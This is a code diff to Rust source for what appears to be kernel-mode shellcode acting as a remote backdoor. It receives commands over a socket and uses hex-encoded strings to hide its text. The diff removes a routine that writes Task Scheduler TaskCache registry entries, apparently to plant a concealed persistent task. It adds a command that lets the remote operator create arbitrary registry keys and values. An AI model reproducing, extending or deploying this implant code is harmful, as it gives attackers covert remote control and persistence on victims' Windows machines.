@@ -157,7 +157,7 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
             let write_cmd = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8];
             let read_cmd = [0x72u8, 0x65u8, 0x61u8, 0x64u8, 0x20u8];
             let queryvalkey_cmd = [0x71u8, 0x75u8, 0x65u8, 0x72u8, 0x79u8, 0x76u8, 0x61u8, 0x6cu8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8];
-            let schtask_cmd = [0x73u8, 0x63u8, 0x68u8, 0x74u8, 0x61u8, 0x73u8, 0x6bu8, 0x0au8];            
+            let setkey_cmd = [0x73u8, 0x65u8, 0x74u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8];          
             if ntdef::macros::RtlEqualMemory(buf as _, &echo_cmd as _, 5) == 1u32 {
                 let _ = socket.send((buf as *const u8).offset(5) as *const u8, buf_len - 5);
             } else if ntdef::macros::RtlEqualMemory(buf as _, &close_cmd as _, 6) == 1u32 {
@@ -412,14 +412,13 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                     let key_open_error_msg = [0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
                     let _ = socket.send(&key_open_error_msg as *const u8, 15);
                 }
-            } else if ntdef::macros::RtlEqualMemory(buf as _, &schtask_cmd as _, 8) == 1u32 {
-                let action_key_raw = [0x5cu8, 0x52u8, 0x65u8, 0x67u8, 0x69u8, 0x73u8, 0x74u8, 0x72u8, 0x79u8, 0x5cu8, 0x4du8, 0x61u8, 0x63u8, 0x68u8, 0x69u8, 0x6eu8, 0x65u8, 0x5cu8, 0x53u8, 0x4fu8, 0x46u8, 0x54u8, 0x57u8, 0x41u8, 0x52u8, 0x45u8, 0x5cu8, 0x4du8, 0x69u8, 0x63u8, 0x72u8, 0x6fu8, 0x73u8, 0x6fu8, 0x66u8, 0x74u8, 0x5cu8, 0x57u8, 0x69u8, 0x6eu8, 0x64u8, 0x6fu8, 0x77u8, 0x73u8, 0x20u8, 0x4eu8, 0x54u8, 0x5cu8, 0x43u8, 0x75u8, 0x72u8, 0x72u8, 0x65u8, 0x6eu8, 0x74u8, 0x56u8, 0x65u8, 0x72u8, 0x73u8, 0x69u8, 0x6fu8, 0x6eu8, 0x5cu8, 0x53u8, 0x63u8, 0x68u8, 0x65u8, 0x64u8, 0x75u8, 0x6cu8, 0x65u8, 0x5cu8, 0x54u8, 0x61u8, 0x73u8, 0x6bu8, 0x43u8, 0x61u8, 0x63u8, 0x68u8, 0x65u8, 0x5cu8, 0x54u8, 0x72u8, 0x65u8, 0x65u8, 0x5cu8, 0x44u8, 0x65u8, 0x66u8, 0x61u8, 0x75u8, 0x6cu8, 0x74u8, 0x55u8, 0x70u8, 0x64u8, 0x61u8, 0x74u8, 0x65u8, 0x00u8];
-                let action_key: *mut u8 = buf as _;
-                ntdef::macros::RtlCopyMemory(action_key, &action_key_raw as _, 101);
+            } else if ntdef::macros::RtlEqualMemory(buf as _, &setkey_cmd as _, 7) == 1u32 {
+                *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
+                let reg_key: *mut u8 = (buf as *mut u8).offset(7) as _;
 
                 let mut key_create_error: u32 = 0 as _;
                 let mut handle: ntdef::types::HANDLE = scratch_buf as _;
-                let _ = match ntreg::create_key(reg_funcs, action_key as _, &mut handle as _, 204 as _) {
+                let _ = match ntreg::create_key(reg_funcs, reg_key as _, &mut handle as _, 1460 as _) {
                     0 => 0,
                     _ => {
                         key_create_error = 1 as _;
@@ -427,368 +426,89 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                     }
                 };
                 if key_create_error == 0 as _ {
-                    let mut status: u32;
-                    let value_name_raw = [0x49u8, 0x64u8, 0x00u8];
-                    let value_name: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 8) as _;
-                    ntdef::macros::RtlZeroMemory(value_name as _, 8);
-                    ntdef::macros::RtlCopyMemory(value_name, &value_name_raw as _, 3);
+                    let send_the_subkey_name_msg = [0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x20u8, 0x74u8, 0x68u8, 0x65u8, 0x20u8, 0x73u8, 0x75u8, 0x62u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x6eu8, 0x61u8, 0x6du8, 0x65u8, 0x0au8];
+                    let _ = socket.send(&send_the_subkey_name_msg as *const u8, 21);
 
-                    let key_id_raw = [0x7bu8, 0x33u8, 0x35u8, 0x44u8, 0x42u8, 0x46u8, 0x45u8, 0x45u8, 0x38u8, 0x2du8, 0x41u8, 0x37u8, 0x46u8, 0x38u8, 0x2du8, 0x34u8, 0x34u8, 0x46u8, 0x43u8, 0x2du8, 0x38u8, 0x38u8, 0x45u8, 0x31u8, 0x2du8, 0x41u8, 0x30u8, 0x41u8, 0x46u8, 0x41u8, 0x30u8, 0x35u8, 0x33u8, 0x36u8, 0x37u8, 0x32u8, 0x37u8, 0x7du8, 0x00u8];
-                    let key_id: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 80) as _;
-                    ntdef::macros::RtlZeroMemory(key_id as _, 80 as _);
-                    ntdef::macros::RtlCopyMemory(key_id, &key_id_raw as _, 39);
+                    (buf_len, exec) = recv_msg(tdi_ctx, buf);
+                    *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
+                    
+                    let subkey_name: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, (buf_len*2) as _) as _;
+                    ntdef::macros::RtlCopyMemory(subkey_name as _, buf as _, buf_len as _);
+                    let subkey_name_buf_size = buf_len*2;    // needed for unicode
 
-                    status = ntreg::set_key(
-                        reg_funcs, handle, value_name, 8, ntdef::enums::REG_SZ, key_id as _, 80
-                    );
+                    let send_the_subkey_type_msg = [0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x20u8, 0x74u8, 0x68u8, 0x65u8, 0x20u8, 0x73u8, 0x75u8, 0x62u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x74u8, 0x79u8, 0x70u8, 0x65u8, 0x0au8];
+                    let _ = socket.send(&send_the_subkey_type_msg as *const u8, 21);
 
-                    if status == 0 as _ {
-                        let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                        let _ = socket.send(&set_key_success_msg as *const u8, 16);
+                    (buf_len, exec) = recv_msg(tdi_ctx, buf);
+                    let key_type: ntdef::types::ULONG;
+                    let reg_sz_cmp = [0x52u8, 0x45u8, 0x47u8, 0x5fu8, 0x53u8, 0x5au8];
+                    let reg_dword_cmp = [0x52u8, 0x45u8, 0x47u8, 0x5fu8, 0x44u8, 0x57u8, 0x4fu8, 0x52u8, 0x44u8];
+                    let reg_binary_cmp = [0x52u8, 0x45u8, 0x47u8, 0x5fu8, 0x42u8, 0x49u8, 0x4eu8, 0x41u8, 0x52u8, 0x59u8];
+                    let matched: u32;
+                    if ntdef::macros::RtlEqualMemory(buf as _, &reg_sz_cmp as _, 5) == 1u32 {
+                        key_type = ntdef::enums::REG_SZ;
+                        matched = 1 as _;
+                    } else if ntdef::macros::RtlEqualMemory(buf as _, &reg_dword_cmp as _, 9) == 1u32 {
+                        key_type = ntdef::enums::REG_DWORD;
+                        matched = 1 as _;
+                    } else if ntdef::macros::RtlEqualMemory(buf as _, &reg_binary_cmp as _, 10) == 1u32 {
+                        key_type = ntdef::enums::REG_BINARY;
+                        matched = 1 as _;
                     } else {
-                        let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                        let _ = socket.send(&set_key_error_msg as *const u8, 14);
+                        key_type = ntdef::enums::REG_NONE;
+                        matched = 0 as _;
                     }
 
-                    ((*reg_funcs).ex_free_pool_with_tag)(value_name as _, 73);
-                    ((*reg_funcs).ex_free_pool_with_tag)(key_id as _, 73);
+                    if matched == 1 as _ {
+                        let send_the_subkey_value_msg = [0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x20u8, 0x74u8, 0x68u8, 0x65u8, 0x20u8, 0x73u8, 0x75u8, 0x62u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x76u8, 0x61u8, 0x6cu8, 0x75u8, 0x65u8, 0x0au8];
+                        let _ = socket.send(&send_the_subkey_value_msg as *const u8, 22);
+                        (buf_len, exec) = recv_msg(tdi_ctx, buf);
+                        let subkey_value: ntdef::types::PVOID;
+                        let subkey_value_buf_size: u32;
+                        if key_type == ntdef::enums::REG_SZ {
+                            *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
+                            subkey_value = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, (buf_len*2) as _) as _;
+                            ntdef::macros::RtlZeroMemory(subkey_value as _, (buf_len*2) as _);
+                            ntdef::macros::RtlCopyMemory(subkey_value as _, buf as _, buf_len as _);
+                            subkey_value_buf_size = buf_len*2;    // needed for unicode
+                        } else if key_type == ntdef::enums::REG_DWORD {
+                            // assuming the value is sent as a string
+                            *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
+                            let subkey_value_raw = ntdef::macros::IntFromStr(buf as _);
+                            subkey_value = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 4) as _;
+                            (*subkey_value) = subkey_value_raw as _;
+                            subkey_value_buf_size = 4;
+                        } else if key_type == ntdef::enums::REG_BINARY {
+                            buf_len = buf_len - 1;  // suppose we have newline at the end
+                            subkey_value = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, buf_len as _) as _;
+                            ntdef::macros::RtlCopyMemory(subkey_value as _, buf as _, buf_len as _);
+                            subkey_value_buf_size = buf_len;
+                        } else {
+                            // can't enter in else branch because of the "matched" context, but rust forces to implement it
+                            subkey_value = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 2 as _) as _;
+                            subkey_value_buf_size = 1;
+                        }
+                        let status: u32 = ntreg::set_key(
+                            reg_funcs, handle, subkey_name as _, subkey_name_buf_size as _, key_type as _,
+                            subkey_value as _, subkey_value_buf_size as _
+                        );
+                        if status == 0 as _ {
+                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
+                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
+                        } else {
+                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
+                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
+                        }
+                        ((*reg_funcs).ex_free_pool_with_tag)(subkey_value as _, 74);
 
-                    let index_raw = [0x49u8, 0x6eu8, 0x64u8, 0x65u8, 0x78u8, 0x00u8];
-                    let index: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 14) as _;
-                    ntdef::macros::RtlZeroMemory(index as _, 14);
-                    ntdef::macros::RtlCopyMemory(index, &index_raw as _, 6);
-
-                    let index_val: ntdef::types::PULONG = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 4) as _;
-                    (*index_val) = 3 as ntdef::types::DWORD;
-
-                    status = ntreg::set_key(
-                        reg_funcs, handle, index, 12, ntdef::enums::REG_DWORD, index_val as _, 4
-                    );
-
-                    if status == 0 as _ {
-                        let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                        let _ = socket.send(&set_key_success_msg as *const u8, 16);
                     } else {
-                        let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                        let _ = socket.send(&set_key_error_msg as *const u8, 14);
+                        let not_implemented_msg = [0x6eu8, 0x6fu8, 0x74u8, 0x20u8, 0x69u8, 0x6du8, 0x70u8, 0x6cu8, 0x65u8, 0x6du8, 0x65u8, 0x6eu8, 0x74u8, 0x65u8, 0x64u8, 0x0au8];
+                        let _ = socket.send(&not_implemented_msg as *const u8, 16);
                     }
 
-                    ((*reg_funcs).ex_free_pool_with_tag)(index as _, 73);
-                    ((*reg_funcs).ex_free_pool_with_tag)(index_val as _, 73);
-
-                    let sd_name_raw = [0x53u8, 0x44u8, 0x00u8];
-                    let sd_name: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 8) as _;
-                    ntdef::macros::RtlZeroMemory(sd_name as _, 8);
-                    ntdef::macros::RtlCopyMemory(sd_name, &sd_name_raw as _, 3);
-
-                    let sd_value_raw = [0x01u8, 0x00u8, 0x04u8, 0x80u8, 0x78u8, 0x00u8, 0x00u8, 0x00u8, 0x88u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x14u8, 0x00u8, 0x00u8, 0x00u8, 0x02u8, 0x00u8, 0x64u8, 0x00u8, 0x04u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x10u8, 0x18u8, 0x00u8, 0x9fu8, 0x01u8, 0x1fu8, 0x00u8, 0x01u8, 0x02u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x05u8, 0x20u8, 0x00u8, 0x00u8, 0x00u8, 0x20u8, 0x02u8, 0x00u8, 0x00u8, 0x00u8, 0x10u8, 0x14u8, 0x00u8, 0x9fu8, 0x01u8, 0x1fu8, 0x00u8, 0x01u8, 0x01u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x05u8, 0x12u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x10u8, 0x18u8, 0x00u8, 0xffu8, 0x01u8, 0x1fu8, 0x00u8, 0x01u8, 0x02u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x05u8, 0x20u8, 0x00u8, 0x00u8, 0x00u8, 0x20u8, 0x02u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x14u8, 0x00u8, 0x89u8, 0x00u8, 0x12u8, 0x00u8, 0x01u8, 0x01u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x05u8, 0x12u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x01u8, 0x02u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x05u8, 0x20u8, 0x00u8, 0x00u8, 0x00u8, 0x20u8, 0x02u8, 0x00u8, 0x00u8, 0x01u8, 0x05u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x00u8, 0x05u8, 0x15u8, 0x00u8, 0x00u8, 0x00u8, 0xa0u8, 0xdau8, 0x06u8, 0x43u8, 0x75u8, 0x7du8, 0x9du8, 0x47u8, 0xd6u8, 0x2du8, 0x25u8, 0x3au8, 0x01u8, 0x02u8, 0x00u8, 0x00u8];
-                    let sd_value: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 164) as _;
-                    ntdef::macros::RtlCopyMemory(sd_value, &sd_value_raw as _, 164);
-
-                    status = ntreg::set_key(
-                        reg_funcs, handle, sd_name, 12, ntdef::enums::REG_BINARY, sd_value as _, 164
-                    );
-
-                    if status == 0 as _ {
-                        let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                        let _ = socket.send(&set_key_success_msg as *const u8, 16);
-                    } else {
-                        let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                        let _ = socket.send(&set_key_error_msg as *const u8, 14);
-                    }
-
-                    ((*reg_funcs).ex_free_pool_with_tag)(sd_name as _, 73);
-                    ((*reg_funcs).ex_free_pool_with_tag)(sd_value as _, 73);
+                    ((*reg_funcs).ex_free_pool_with_tag)(subkey_name as _, 73);
 
                     ntreg::close_handle(reg_funcs, handle);
-
-                    let task_key_raw = [0x5cu8, 0x52u8, 0x65u8, 0x67u8, 0x69u8, 0x73u8, 0x74u8, 0x72u8, 0x79u8, 0x5cu8, 0x4du8, 0x61u8, 0x63u8, 0x68u8, 0x69u8, 0x6eu8, 0x65u8, 0x5cu8, 0x53u8, 0x4fu8, 0x46u8, 0x54u8, 0x57u8, 0x41u8, 0x52u8, 0x45u8, 0x5cu8, 0x4du8, 0x69u8, 0x63u8, 0x72u8, 0x6fu8, 0x73u8, 0x6fu8, 0x66u8, 0x74u8, 0x5cu8, 0x57u8, 0x69u8, 0x6eu8, 0x64u8, 0x6fu8, 0x77u8, 0x73u8, 0x20u8, 0x4eu8, 0x54u8, 0x5cu8, 0x43u8, 0x75u8, 0x72u8, 0x72u8, 0x65u8, 0x6eu8, 0x74u8, 0x56u8, 0x65u8, 0x72u8, 0x73u8, 0x69u8, 0x6fu8, 0x6eu8, 0x5cu8, 0x53u8, 0x63u8, 0x68u8, 0x65u8, 0x64u8, 0x75u8, 0x6cu8, 0x65u8, 0x5cu8, 0x54u8, 0x61u8, 0x73u8, 0x6bu8, 0x43u8, 0x61u8, 0x63u8, 0x68u8, 0x65u8, 0x5cu8, 0x54u8, 0x61u8, 0x73u8, 0x6bu8, 0x73u8, 0x5cu8, 0x7bu8, 0x33u8, 0x35u8, 0x44u8, 0x42u8, 0x46u8, 0x45u8, 0x45u8, 0x38u8, 0x2du8, 0x41u8, 0x37u8, 0x46u8, 0x38u8, 0x2du8, 0x34u8, 0x34u8, 0x46u8, 0x43u8, 0x2du8, 0x38u8, 0x38u8, 0x45u8, 0x31u8, 0x2du8, 0x41u8, 0x30u8, 0x41u8, 0x46u8, 0x41u8, 0x30u8, 0x35u8, 0x33u8, 0x36u8, 0x37u8, 0x32u8, 0x37u8, 0x7du8, 0x00u8];
-                    let task_key: *mut u8 = buf as _;
-                    ntdef::macros::RtlCopyMemory(task_key, &task_key_raw as _, 127);
-
-                    let _ = match ntreg::create_key(reg_funcs, action_key as _, &mut handle as _, 256 as _) {
-                        0 => 0,
-                        _ => {
-                            key_create_error = 1 as _;
-                            1
-                        }
-                    };
-
-                    if key_create_error == 0 as _ {
-                        let path_raw = [0x50u8, 0x61u8, 0x74u8, 0x68u8, 0x00u8];
-                        let path: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 10) as _;
-                        ntdef::macros::RtlZeroMemory(path as _, 10);
-                        ntdef::macros::RtlCopyMemory(path, &path_raw as _, 5);
-
-                        let path_value_raw = [0x5cu8, 0x44u8, 0x65u8, 0x66u8, 0x61u8, 0x75u8, 0x6cu8, 0x74u8, 0x55u8, 0x70u8, 0x64u8, 0x61u8, 0x74u8, 0x65u8, 0x00u8];
-                        let path_value: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 32) as _;
-                        ntdef::macros::RtlZeroMemory(path_value as _, 32);
-                        ntdef::macros::RtlCopyMemory(path_value, &path_value_raw as _, 15);
-
-                        status = ntreg::set_key(
-                            reg_funcs, handle, path, 10, ntdef::enums::REG_SZ, path_value as _, 32
-                        );
-    
-                        if status == 0 as _ {
-                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
-                        } else {
-                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
-                        }
-
-                        ((*reg_funcs).ex_free_pool_with_tag)(path as _, 74);
-                        ((*reg_funcs).ex_free_pool_with_tag)(path_value as _, 74);
-
-                        let hash_raw = [0x48u8, 0x61u8, 0x73u8, 0x68u8, 0x00u8];
-                        let hash: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 10) as _;
-                        ntdef::macros::RtlZeroMemory(hash as _, 10);
-                        ntdef::macros::RtlCopyMemory(hash, &hash_raw as _, 5);
-
-                        let hash_value_raw = [0x0bu8, 0xd5u8, 0x3eu8, 0xbdu8, 0xe0u8, 0x8fu8, 0x32u8, 0x98u8, 0x47u8, 0xd3u8, 0x02u8, 0xdbu8, 0xf3u8, 0x40u8, 0x75u8, 0x6cu8, 0x00u8, 0xf1u8, 0x32u8, 0x60u8, 0xf1u8, 0x58u8, 0x09u8, 0x5bu8, 0x61u8, 0x41u8, 0xe5u8, 0x38u8, 0xc5u8, 0x69u8, 0x5au8, 0xf8u8];
-                        let hash_value: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 32) as _;
-                        ntdef::macros::RtlCopyMemory(hash_value, &hash_value_raw as _, 32);
-
-                        status = ntreg::set_key(
-                            reg_funcs, handle, hash, 10, ntdef::enums::REG_BINARY, hash_value as _, 32
-                        );
-    
-                        if status == 0 as _ {
-                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
-                        } else {
-                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
-                        }
-
-                        ((*reg_funcs).ex_free_pool_with_tag)(hash as _, 74);
-                        ((*reg_funcs).ex_free_pool_with_tag)(hash_value as _, 74);
-
-                        let schema_raw = [0x53u8, 0x63u8, 0x68u8, 0x65u8, 0x6du8, 0x61u8, 0x00u8];
-                        let schema: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 16) as _;
-                        ntdef::macros::RtlZeroMemory(schema as _, 16);
-                        ntdef::macros::RtlCopyMemory(schema, &schema_raw as _, 7);
-
-                        let schema_value: ntdef::types::PULONG = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 4) as _;
-                        (*schema_value) = 65540 as ntdef::types::DWORD;
-
-                        status = ntreg::set_key(
-                            reg_funcs, handle, schema, 16, ntdef::enums::REG_DWORD, schema_value as _, 4
-                        );
-
-                        if status == 0 as _ {
-                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
-                        } else {
-                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
-                        }
-
-                        ((*reg_funcs).ex_free_pool_with_tag)(schema as _, 74);
-                        ((*reg_funcs).ex_free_pool_with_tag)(schema_value as _, 74);
-
-                        let version_raw = [0x56u8, 0x65u8, 0x72u8, 0x73u8, 0x69u8, 0x6fu8, 0x6eu8, 0x00u8];
-                        let version: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 18) as _;
-                        ntdef::macros::RtlZeroMemory(version as _, 18);
-                        ntdef::macros::RtlCopyMemory(version, &version_raw as _, 8);
-
-                        let version_value_raw = [0x31u8, 0x2eu8, 0x30u8, 0x00u8];
-                        let version_value: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 10) as _;
-                        ntdef::macros::RtlZeroMemory(version_value as _, 10);
-                        ntdef::macros::RtlCopyMemory(version_value, &version_value_raw as _, 4);
-
-                        status = ntreg::set_key(
-                            reg_funcs, handle, version, 18, ntdef::enums::REG_SZ, version_value as _, 10
-                        );
-    
-                        if status == 0 as _ {
-                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
-                        } else {
-                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
-                        }
-
-                        ((*reg_funcs).ex_free_pool_with_tag)(version as _, 74);
-                        ((*reg_funcs).ex_free_pool_with_tag)(version_value as _, 74);
-                        /*
-                        let date_raw = [0x44u8, 0x61u8, 0x74u8, 0x65u8, 0x00u8];
-                        let date: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 10) as _;
-                        ntdef::macros::RtlZeroMemory(date as _, 10);
-                        ntdef::macros::RtlCopyMemory(date, &date_raw as _, 5);
-
-                        let date_value_raw = [0x32u8, 0x30u8, 0x32u8, 0x32u8, 0x2du8, 0x30u8, 0x39u8, 0x2du8, 0x30u8, 0x36u8, 0x54u8, 0x31u8, 0x39u8, 0x3au8, 0x30u8, 0x38u8, 0x3au8, 0x32u8, 0x36u8, 0x2eu8, 0x32u8, 0x35u8, 0x37u8, 0x32u8, 0x35u8, 0x38u8, 0x32u8, 0x00u8];
-                        let date_value: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 58) as _;
-                        ntdef::macros::RtlZeroMemory(date_value as _, 58);
-                        ntdef::macros::RtlCopyMemory(date_value, &date_value_raw as _, 28);
-
-                        status = ntreg::set_key(
-                            reg_funcs, handle, date, 10, ntdef::enums::REG_SZ, date_value as _, 58
-                        );
-    
-                        if status == 0 as _ {
-                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
-                        } else {
-                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
-                        }
-
-                        ((*reg_funcs).ex_free_pool_with_tag)(date as _, 74);
-                        ((*reg_funcs).ex_free_pool_with_tag)(date_value as _, 74);
-
-                        let author_raw = [0x41u8, 0x75u8, 0x74u8, 0x68u8, 0x6fu8, 0x72u8, 0x00u8];
-                        let author: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 16) as _;
-                        ntdef::macros::RtlZeroMemory(author as _, 16);
-                        ntdef::macros::RtlCopyMemory(author, &author_raw as _, 7);
-
-                        let author_value_raw = [0x57u8, 0x49u8, 0x4eu8, 0x31u8, 0x30u8, 0x5cu8, 0x61u8, 0x64u8, 0x6du8, 0x69u8, 0x6eu8, 0x00u8];
-                        let author_value: *mut u8 = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 26) as _;
-                        ntdef::macros::RtlZeroMemory(author_value as _, 26);
-                        ntdef::macros::RtlCopyMemory(author_value, &author_value_raw as _, 12);
-
-                        status = ntreg::set_key(
-                            reg_funcs, handle, author, 16, ntdef::enums::REG_SZ, author_value as _, 26
-                        );
-    
-                        if status == 0 as _ {
-                            let set_key_success_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
-                            let _ = socket.send(&set_key_success_msg as *const u8, 16);
-                        } else {
-                            let set_key_error_msg = [0x73u8, 0x65u8, 0x74u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
-                            let _ = socket.send(&set_key_error_msg as *const u8, 14);
-                        }
-
-                        ((*reg_funcs).ex_free_pool_with_tag)(author as _, 74);
